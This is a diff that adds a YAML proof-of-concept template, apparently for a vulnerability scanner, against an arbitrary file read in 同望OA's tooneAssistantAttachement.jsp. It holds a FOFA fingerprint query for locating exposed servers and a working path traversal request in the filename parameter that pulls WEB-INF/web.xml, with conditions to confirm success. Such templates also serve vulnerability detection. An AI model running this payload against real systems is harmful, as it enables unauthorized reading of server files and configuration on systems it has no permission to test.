@@ -1,0 +1,22 @@
+id: poc-yaml-etwowin-oa-tooneassistantattachement-jsp-anyfile-read
+info:
+  name: 同望OA tooneAssistantAttachement.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 同望OA
+  fofa: body="loginAction.struts?actionType=blockLogin"
+requests:
+- method: GET
+  path: /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"web-app") &&
+
+    contains(body,"<display-name>") &&
+
+    contains(headers,"fileName=web.xml")
+
+    '
+variables: {}
+transport: http
